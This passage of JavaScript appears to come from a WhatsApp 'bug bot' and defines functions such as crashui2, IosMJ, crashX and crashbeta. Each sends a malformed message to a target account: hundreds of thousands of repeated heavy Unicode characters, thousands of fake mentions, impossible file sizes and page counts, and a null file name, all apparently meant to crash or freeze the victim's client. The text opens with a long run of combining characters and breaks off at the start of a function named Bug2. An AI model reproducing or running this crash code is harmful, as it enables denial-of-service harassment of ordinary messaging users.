⃪⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["18492098766@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};
	async function crashui2(target, ptcp = false) {
    await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function IosMJ(target, Ptcp = false) {
      await AndraZyy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://AndraZyy_Agler_Forger",
                mediaUrl: "https://AndraZyy_Agler_Forger",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://AndraZyy_Agler_Forger",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function crashX(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
 "documentMessage": {
 "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
 "mimetype": "penis",
 "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
 "fileLength": "999999999",
 "pageCount": 999999999,
 "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
 "fileName": `⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄.xp`+"ྦྷ".repeat(60000),
 "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
 "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
 "mediaKeyTimestamp": "1715880173"
 }
}), { userJid: target, quoted: kuwoted });
await AndraZyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function crashbeta(target, ptcp = false) {
let BetaFc = "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "Juice nih deck" 
                            }
                        ]
                    }
                }
            }
        }
    }
}
}

async function Bug2(target, ptcp = false) {
